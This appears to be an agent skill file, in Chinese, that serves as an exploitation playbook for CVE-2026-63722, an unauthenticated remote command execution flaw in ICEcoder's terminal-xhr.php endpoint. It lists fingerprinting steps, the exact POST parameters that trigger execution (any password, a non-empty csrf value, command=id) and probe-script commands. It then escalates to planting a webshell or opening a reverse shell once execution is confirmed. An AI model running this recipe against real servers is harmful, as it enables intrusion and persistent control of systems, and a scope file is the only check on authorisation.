---
name: icecoder-unauth-rce
description: >-
 授权目标上 ICEcoder（浏览器 IDE）CVE-2026-63722：lib/terminal-xhr.php
 未授权命令执行面。用户提到 ICEcoder、terminal-xhr.php、CVE-2026-63722、
 在线 IDE 终端未授权时使用。默认 GET；--deep 才 POST command=id。
---

# ICEcoder 未授权 RCE

**前提**：目标在 `config/scope*.json`。

| 档 | 成立 | 不算 |
|----|------|------|
| L1 | 标题 ICEcoder，或 GET 终端 JSON 含 `no command received` | 空 200 |
| L2 | `--deep` POST `command=id` 回 `uid=` | GET 200 当已 RCE |
| L3 | 写马 / 反弹 | 授权内直接做 |

```bash
python3 tools/ops/icecoder_surface_probe.py --base https://授权站 --case <案卷>
python3 tools/ops/icecoder_surface_probe.py --base https://授权站 --case <案卷> --deep
```

## 四刀

1. **认 IDE** — `/` `/icecoder/` 标题  
2. **终端活** — GET `/lib/terminal-xhr.php`（也试 `/ICEcoder/lib/`）  
3. **RCE** — `--deep`：任意 `password` + 非空 `csrf` + `command=id`  
4. **落地** — L2 后再写 marker / 反弹，不要把 nuclei 命中当已执行

真源：`docs/playbooks/ICEcoder未授权RCE手法.md`
